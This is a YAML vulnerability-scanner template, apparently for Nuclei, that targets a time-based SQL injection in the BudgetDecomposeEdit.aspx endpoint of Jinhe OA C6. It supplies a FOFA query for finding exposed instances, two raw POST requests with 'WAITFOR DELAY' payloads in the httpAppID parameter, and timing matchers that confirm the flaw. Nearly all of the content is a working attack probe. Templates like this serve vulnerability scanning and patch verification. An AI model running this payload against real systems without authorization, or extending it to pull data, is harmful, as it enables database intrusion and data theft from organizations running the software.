id: jinhe-oa-c6-budgetdecomposeedit-sqli
info:
  name: 金和OA C6 BudgetDecomposeEdit.aspx接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
      金和OA C6系统BudgetDecomposeEdit.aspx接口存在SQL注入漏洞，攻击者可通过构造恶意输入参数实现数据库查询操控，可能导致敏感数据泄露或系统权限突破。
  tags: 金和OA
http:
- raw:
  - |
    POST /c6/JHSoft.Web.CostControl/Decompose/BudgetDecomposeEdit.aspx/ HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    httpAppID=1' WAITFOR DELAY '0:0:5'--&httpOID=1
  - |
    POST /c6/JHSoft.Web.CostControl/Decompose/BudgetDecomposeEdit.aspx/ HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    httpAppID=1' WAITFOR DELAY '0:0:8'--&httpOID=1
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
